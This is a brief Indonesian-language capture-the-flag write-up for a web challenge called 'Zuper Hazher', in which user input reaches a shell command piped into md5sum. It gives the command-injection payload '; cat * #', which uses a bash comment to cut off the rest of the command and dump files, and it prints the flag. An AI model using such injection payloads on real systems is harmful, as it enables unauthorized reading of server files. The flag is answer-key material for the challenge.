# __ASGama CTF__ 
## _Zuper Hazher_

## Information
**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
Web | 60 | l0l

**Description:** 

> http://ctf.asgama.web.id:40111/
>
> [source](./zuperhasher.txt)

### Zuper Hazher
Mirip seperti [KimiNoNawa](../Kimi\ No\ Nawa/README.md). Hanya saja kali ini apapun outputnya dimasukkan sebagai input untuk `md5sum`.

Dapat dengan mudah di bypass dengan menambahkan `#` (tanda komentar pada bash) di akhir input

### Payload
```
; cat * #
```

### Result
```
GamaCTF{Sl4lu_T3tap_D1_H4t1} 
```

### Flag
GamaCTF{Sl4lu_T3tap_D1_H4t1} 